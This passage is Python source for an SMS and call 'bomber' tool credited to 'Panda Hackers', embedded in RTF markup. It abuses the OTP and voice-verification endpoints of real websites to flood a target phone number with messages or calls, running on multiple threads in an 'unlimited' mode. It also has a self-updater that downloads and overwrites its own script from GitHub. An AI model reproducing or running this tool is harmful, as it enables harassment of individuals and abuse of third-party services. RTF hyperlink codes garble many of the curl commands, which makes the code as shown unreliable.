        if rd.find("\\"statusCode\\":\\"1\\"") != -1:\par
            return True\par
        else:\par
            return False\par
    elif lim == 14:\par
        con = '\{"country_code":"' + cc + '","phone_number":"' + pn + '"\}'\par
        os.popen('rm temp.xxx2 > /dev/null 2>&1')\par
        os.system('curl -s -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:' + str(len(con)) +\par
                  '" -H "Accept:application/json, text/plain, */*" -H "Origin:https://lite.altbalaji.com" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36" -H "Content-Type:application/json;charset=UTF-8" -H "Referer:https://lite.altbalaji.com/subscribe?progress=input" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -d \\'' + con + '\\' "{{\field{\*\fldinst{HYPERLINK https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN }}{\fldrslt{https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN\ul0\cf0}}}}\f0\fs22 " -o temp.xxx2')\par
        while not os.path.exists('temp.xxx2'):\par
            time.sleep(0.1)\par
        rd = hashlib.md5(open('temp.xxx2', 'rb').read()).hexdigest()\par
        return rd == '24f467b24087ff48c96321786d89c69f'\par
    elif lim == 15:\par
        rd = os.popen('curl -s -X POST -H "Host:www.aala.com" -H "Connection:keep-alive" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://www.aala.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.aala.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:frontend=a27mn3h3irt1rlt6i55s93p9r5; frontend_cid=8zqBBzwQTMIt9UKg; _BEAMER_USER_ID_gADrycBn12870=c9fe4f7d-b421-4bad-9cf2-0a4db716dff4; G_ENABLED_IDPS=google" -d \\'email=' + cc + pn + '&firstname=Panda Hackers&lastname=Panda Hackers\\' "{{\field{\*\fldinst{HYPERLINK https://www.aala.com/accustomer/ajax/getOTP }}{\fldrslt{https://www.aala.com/accustomer/ajax/getOTP\ul0\cf0}}}}\f0\fs22 "').read().strip()\par
        return rd.find('code:') != -1\par
    elif lim == 16:\par
        os.popen('curl -s -X POST -d \\'method=SMS&countryCode=id&phoneNumber=' + cc + pn +\par
                 '&templateID=pax_android_production\\' "{{\field{\*\fldinst{HYPERLINK https://api.grab.com/grabid/v1/phone/otp }}{\fldrslt{https://api.grab.com/grabid/v1/phone/otp\ul0\cf0}}}}\f0\fs22 "')\par
        return True\par
    elif lim == 100:\par
        rd = os.popen('curl -s -X GET "{{\field{\*\fldinst{HYPERLINK https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' }}{\fldrslt{https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/'\ul0\cf0}}}}\f0\fs22  +\par
                      pn + '?callType=otpOnCall"').read()\par
        return rd.lower().find("new otp has been") != -1\par
    elif lim == 101:\par
        rd = os.popen('curl -s -X POST -d mobile=%2B' + cc + '-' + pn +\par
                      ' {{\field{\*\fldinst{HYPERLINK https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read( }}{\fldrslt{https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read(\ul0\cf0}}}}\f0\fs22 )\par
        return rd.lower().find("otp requests exceeded") == -1\par
    elif lim == 102:\par
        rd = os.popen('curl -s -X POST -H "Host:www.realestateindia.com" -H "content-length:58" -H "accept:text/html, */*; q=0.01" -H "origin:https://www.realestateindia.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.realestateindia.com/thanks.php?newreg" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_gat=1" -H "cookie:rei_mem_mobile_verify_status=0" -H "cookie:rei_mem_email_verify_status=N" -H "cookie:rei_mem_block_status=0" -H "cookie:rei_member_country=IN" -H "cookie:rei_paid_status=0" -H "cookie:rei_member_type=1" -H "cookie:rei_member_email=Fakemam%40ril.com" -H "cookie:rei_member_name=Fakeman" -H "cookie:rei_member_id=1547045" -H "cookie:cooki_sess_id=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:name=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:_gid=GA1.2.626525909.1560836369" -H "cookie:_ga=GA1.2.1033079331.1560836369" -H "cookie:visitedToken=176961560836367" -d \\'action_id=call_to_otp&mob_num=' + pn + '&member_id=1547045\\' "{{\field{\*\fldinst{HYPERLINK https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354 }}{\fldrslt{https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354\ul0\cf0}}}}\f0\fs22 "').read()\par
        return rd.lower().find("y") != -1\par
    elif lim == 103:\par
        os.system(\par
            'curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H "cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H "cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \\'\{"type":"call","descriptor":"+91' + pn + '"\}\\' "{{\field{\*\fldinst{HYPERLINK https://www.olx.in/api/challenges }}{\fldrslt{https://www.olx.in/api/challenges\ul0\cf0}}}}\f0\fs22 " >/dev/null 2>&1')\par
        return True\par
    elif lim == 104:\par
        rd = os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "{{\field{\*\fldinst{HYPERLINK https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + ' }}{\fldrslt{https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '\ul0\cf0}}}}\f0\fs22 "').read().decode('utf-8')\par
        return rd.lower().strip().find('callmade') != -1\par
    elif lim == 106:\par
        rd = os.popen(\par
            'curl -s "{{\field{\*\fldinst{HYPERLINK https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + ' }}{\fldrslt{https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '\ul0\cf0}}}}\f0\fs22 "').read()\par
        return rd.find("1") != -1\par
    return False\par
\par
\par
def remsp(num):\par
    num = num.replace(' ', '')\par
    num = num.replace('-', '')\par
    return num\par
\par
\par
def start(target, counter, delay, ch, cc):\par
    clr()\par
    banner()\par
    failed = 0\par
    requested = 0\par
    success = int(requested) - int(failed)\par
    bombs = int(counter) + 1\par
    while success < (int(bombs)):\par
        os.system('clear')\par
        banner()\par
        try:\par
            api = random.choice(ch)\par
        except Exception:\par
            if cc == "91":\par
                print('Sorry All APIs Have Expired Please Update PBomb')\par
                input('Press Enter To Exit...')\par
                exit()\par
            else:\par
                if success > 0:\par
                    print(\par
                        '\\n\\n\\tWe Are Sorry To Say That Bombing Limit For Your Country Has Been Reached...')\par
                    print(\par
                        '\\nWe Are Working Too Hard To Increase The International Limit...')\par
                    input(\par
                        '\\nThis will help us to give support to your country fast...\\n\\nPress Enter To Exit...')\par
                    os.system('rm *.xxx* > /dev/null 2>&1')\par
                    print('\\n\\n')\par
                    banner()\par
                    exit()\par
                else:\par
                    print('\\n\\n\\tSorry Your Country is Not Supported...')\par
                    print(\par
                        '\\t\\tPlease Send A Mail To Pandahackers127@gmail.com To Let Us Know...')\par
                    input('Press Enter To Exit...')\par
                    exit()\par
        print(random.choice(colors))\par
        print("==================================================================")\par
        print("                BOMBING in progress, please wait !!               ")\par
        print("     Please keep your data connection active during bombing !!    ")\par
        print("==================================================================")\par
        print("             Target Number           : +" + str(cc) + " ", target)\par
        print("             Number of Requests Sent : ", requested)\par
        print("             Successful Requests     : ", success)\par
        print("             Failed Requests         : ", failed)\par
        print("==================================================================")\par
        print("              Use this for fun, not for revenge !!                ")\par
        print("              This Bomber Was Created By Panda Hackers !!                ")\par
        print("==================================================================")\par
        try:\par
            result = getapi(target, api, cc)\par
        except Exception:\par
            result = False\par
        requested = requested + 1\par
        if result:\par
            success = success + 1\par
        else:\par
            failed = failed + 1\par
            while ch.count(api) > 0:\par
                ch.remove(api)\par
        time.sleep(float(delay))\par
        if requested % 3 == 0:\par
            checkinternet()\par
    print(W)\par
    print('\\n\\nBombing Completed..')\par
    os.system('rm *.xxx* > /dev/null 2>&1')\par
    banner()\par
    exit()\par
\par
\par
def update():\par
    stuff_to_update = ['bomber.py', '.version']\par
    for fl in stuff_to_update:\par
        dat = urllib.request.urlopen(\par
            "{{\field{\*\fldinst{HYPERLINK https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/ }}{\fldrslt{https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/\ul0\cf0}}}}\f0\fs22 " + fl).read()\par
        file = open(fl, 'wb')\par
        file.write(dat)\par
        file.close()\par
    print('\\n\\t\\tUpdated Successfull !!!!')\par
    print('\\tPlease Run The Script Again...')\par
    exit()\par
\par
\par
clr()\par
banner()\par
try:\par
    urllib.request.urlopen('https://www.google.com')\par
except Exception:\par
    print("You are not connected To Internet!!!")\par
    print("\\tPlease Connect To Internet To Continue...\\n")\par
    input('Exiting....\\n Press Enter To Continue....')\par
    exit()\par
print('\\tChecking For Updates...')\par
ver = urllib.request.urlopen(\par
    "{{\field{\*\fldinst{HYPERLINK https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/.version }}{\fldrslt{https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/.version\ul0\cf0}}}}\f0\fs22 ").read().decode('utf-8')\par
verl = ''\par
try:\par
    verl = open(".version", 'r').read()\par
except Exception:\par
    pass\par
if ver != verl:\par
    print('\\n\\t\\tAn Update is Available....')\par
    print('\\tStarting Update...')\par
    update()\par
print("Your Version is Up-To-Date")\par
print('\\n\\n\\t\\t\\tStarting PBomb...\\n\\n')\par
try:\par
    noti = urllib.request.urlopen(\par
        "{{\field{\*\fldinst{HYPERLINK https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/.notify }}{\fldrslt{https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/.notify\ul0\cf0}}}}\f0\fs22 ").read().decode('utf-8')\par
    noti = noti.upper().strip()\par
    if len(noti) > 10:\par
        print('\\n\\n\\tNOTIFICATION: ' + noti + '\\n\\n')\par
except Exception:\par
    pass\par
while True:\par
    pn = ""\par
    cc = input("\\tEnter Your Country Code (Without +) : ")\par
    if '+' in cc:\par
        tc = list(cc)\par
        tc.remove('+')\par
        cc = ''.join(tc)\par
        cc = cc.strip()\par
    pn = input("\\tEnter Target Number: +" + cc + " ")\par
    pn = remsp(pn)\par
    if len(cc) >= 4 or len(cc) < 1:\par
        print('\\n\\nInvalid Country Code..\\n\\t\\tCountry Codes Are Generally 1-3 digits...\\n')\par
        continue\par
    if len(pn) <= 6:\par
        print('\\n\\nInvalid Phone Number..\\n')\par
        continue\par
    for cch in str(cc + pn):\par
        if not cch.isdigit():\par
            print('\\n\\nPhone Number Must Consist Of Numbers Only\\n')\par
            continue\par
    break\par
type = 0\par
try:\par
    if sys.argv[1] == "call":\par
        type = 1\par
except Exception:\par
    type = 0\par
if type == 1:\par
    nm = int(input("Enter Number of Calls To Send(Maximum 15): "))\par
    if nm > 15:\par
        print("\\t\\tYou Have Entered " + str(nm) +\par
              ".\\n\\tNormalizing Value To 15")\par
        nm = 15\par
    dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))\par
elif type == 0:\par
    if cc == "91":\par
        nm = int(input("Enter Number of Messages To Send(0 For Unlimited): "))\par
        dl = float(\par
            input("Enter Delay time (in seconds) [Recommended 2 sec ] : "))\par
    else:\par
        nm = int(input("Enter Number of Messages To Send: "))\par
        dl = float(\par
            input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))\par
maxlim = 0\par
if cc == "91":\par
    maxlim = 5000\par
else:\par
    maxlim = 1000\par
if nm > maxlim:\par
    print('\\n\\n\\tSorry Due To Misuse Of This Script We Only Provide ' +\par
          str(maxlim) + ' SMS At Once...\\n\\n')\par
    print('Number Of SMS Has been Set To ' + str(maxlim))\par
    nm = maxlim\par
if not cc.strip() == "91":\par
    if type == 1:\par
        print(\par
            '\\t\\tSorry But Call Bombing is Currently Supported Only For Indian Numbers!!!!')\par
        print()\par
        input('Press Enter To Exit....')\par
        print('\\n\\n')\par
        banner()\par
        exit()\par
    cnt = 0\par
    if pn.strip() == '' or dl <= 0 or nm <= 0 or cc.strip() == '' or cc.find('+') != -1:\par
        print('\\n\\n\\tSeems Like You Have Given Wrong Inputs...')\par
        input('\\n\\t\\tPress Enter To Exit...')\par
        banner()\par
        exit()\par
    ch = [0, 14, 15, 16]\par
    start(pn, nm, dl, ch, str(cc))\par
    exit()\par
ch = [i for i in range(17)]\par
cbomb = False\par
if pn.strip() == '' or dl <= 0 or nm < 0:\par
    print('\\n\\n\\tSeems Like You Have Given Wrong Inputs...')\par
    input('\\n\\t\\tPress Enter To Exit...')\par
    banner()\par
    exit()\par
if type == 1:\par
    print("NOTE: Call Bomb Might Not Work on DND Activated Numbers...\\n")\par
    print("\\n\\tPlease Don't Overload Call Bomb So That Is Would Work For Longer Period Of Time...")\par
    cbomb = True\par
if cbomb:\par
    chl = [100, 101, 102, 103, 104, 105, 106]\par
    start(pn, nm, dl, chl, str(cc))\par
    exit()\par
if nm == 0:\par
    nt = int(input("\\tNumber Of Threads(10 to 20) : "))\par
    if nt <= 0 or nt >= 30:\par
        print('\\tPBomb Shows Better Result in 10 to 25 Threads\\n\\t\\tStill Continuing....')\par
    print("\\n\\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")\par
    t = [None] * nt\par
    print(random.choice(colors))\par
    print("\\n\\n==================================================================")\par
    print("                Gearing Up Bomber, please wait !!               ")\par
    print("     Please keep your data connection active during bombing !!    ")\par
    print("==================================================================")\par
    print("             Target Number       : +91", pn)\par
    print("             Number of Threads   : ", nt)\par
    print("             Delay               : ", dl)\par
    print("==================================================================")\par
    print("              Use this for fun, not for revenge !!                ")\par
    print("              This Bomber Was Created By Panda Hackers !!                ")\par
    print("==================================================================")\par
    print(W)\par
    input('\\n\\nPress CTRL+Z To STOP Bomber... \\nPress Enter To Start Bomber...\\n')\par
    os.system('rm *.xxx* > /dev/null 2>&1')\par
    print("\\n\\nStarting Bomb....")\par
    for i in range(nt):\par
        t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))\par
        t[i].daemon = True\par
        t[i].start()\par
    time.sleep(2)\par
    ci = 0\par
    while True:\par
        ci += 1\par
        l = count_inf\par
        print("    Total Number of Requests Sent : ", l)\par
        if int(l) > maxlim:\par
            print('\\n\\n\\tSorry Due To Misuse Of This Script We Only Provide ' +\par
                  str(maxlim) + ' SMS At Once...\\n\\n')\par
            input('Press Enter To Exit...')\par
            os.system('rm *xxx* > /dev/null 2>&1')\par
            banner()\par
            exit()\par
        time.sleep(1)\par
        if ci % 3 == 0:\par
            checkinternet()\par
else:\par
    start(pn, nm, dl, ch, '91')\par
    exit()\lang9\par
}
 